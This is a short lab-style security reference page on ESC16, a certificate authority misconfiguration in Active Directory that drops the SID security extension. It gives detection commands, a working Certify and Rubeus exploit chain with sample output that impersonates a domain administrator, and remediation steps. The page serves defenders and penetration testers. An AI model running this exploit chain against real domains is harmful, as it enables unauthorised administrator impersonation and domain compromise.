title: ESC16: CA-Wide Security Extension Removal
html:
Conditions: CA configured to omit szOID_NTDS_CA_SECURITY_EXT (OID: 1.3.6.1.4.1.311.25.2) on ALL issued certificates. This breaks strong certificate-to-account binding (KB5014754). Unlike ESC9 (per-template), ESC16 affects the entire CA.

Detect with Certipy v5+

certipy find -u <username>@<domain> -p <password> -dc-ip <dc-ip> -target <ca-host>
certipy find -u missandei@essos.local -p fr3edom -dc-ip 192.168.56.12 -target braavos.essos.local

Certipy v5.0.0 - by Oliver Lyak (ly4k)

[!] ESC16: CA 'ESSOS-CA' is configured to omit szOID_NTDS_CA_SECURITY_EXT on all certificates!

    Security Extension Enforcement : DISABLED (ESC16 VULNERABLE!)

Manual Check

certutil -config "<ca-host>\<ca-name>" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags
certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\...\EditFlags

HKEY_LOCAL_MACHINE\...\EditFlags REG_DWORD = 0x80000 (524288)

Exploit — Any Template Works for Impersonation

Certify.exe request /ca:<ca-host>\<ca-name> /template:User /altname:<target-user>@<domain>
openssl pkcs12 -in cert.pem -export -out <target-user>_esc16.pfx -password pass:mimikatz
Rubeus.exe asktgt /user:<target-user> /certificate:<target-user>_esc16.pfx /password:mimikatz
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:administrator@essos.local

[*] Current user context : ESSOS\missandei
[*] CA Response          : The certificate has been issued.
[*] Request ID           : 20

Rubeus.exe asktgt /user:administrator /certificate:admin_esc16.pfx /password:mimikatz
[+] TGT request successful! - ESC16 allows impersonation without SID binding

  UserName : administrator
  UserRealm: ESSOS.LOCAL

Remediate

# Remove the OID from DisableExtensionList
certutil -config "<ca-host>\<ca-name>" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\DisableExtensionList -"1.3.6.1.4.1.311.25.2"
Restart-Service CertSvc

# Enforce strong mapping on DCs
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc\Parameters" -Name "StrongCertificateBindingEnforcement" -Value 2
Restart-Service kdc
certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\...\DisableExtensionList -"1.3.6.1.4.1.311.25.2"
CertUtil: -setreg command completed successfully.

Restart-Service CertSvc

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc\Parameters" -Name "StrongCertificateBindingEnforcement" -Value 2
Restart-Service kdc
